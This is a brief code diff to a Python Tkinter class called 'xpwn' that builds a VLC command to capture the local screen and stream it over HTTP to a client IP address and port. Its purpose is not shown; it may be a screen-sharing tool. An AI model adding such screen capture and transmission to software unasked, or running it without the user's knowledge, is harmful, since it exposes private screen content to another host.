@@ -218,12 +218,12 @@ class xpwn(tk.Frame):
         return
     self.state = 1
     cmd = vlc_path
-    cmd += u" screen:// "
-    cmd += u"-vvv "
+    cmd += u" -vvv "
+    cmd += u"screen:// "
     cmd += u":screen-fps=30 " 
     cmd += u":screen-caching=100 "
     cmd += u"--sout=\"#"
-    #cmd += "transcode{vcodec=mpv4, acodec=ogg}:"
+    cmd += "transcode{vcodec=mpv4, acodec=ogg}:"
     cmd += "standard{access=http,mux=ogg,dst="
     cmd += self.client_ip + ":" + str(self.vlc_port)
     cmd += u"}\""
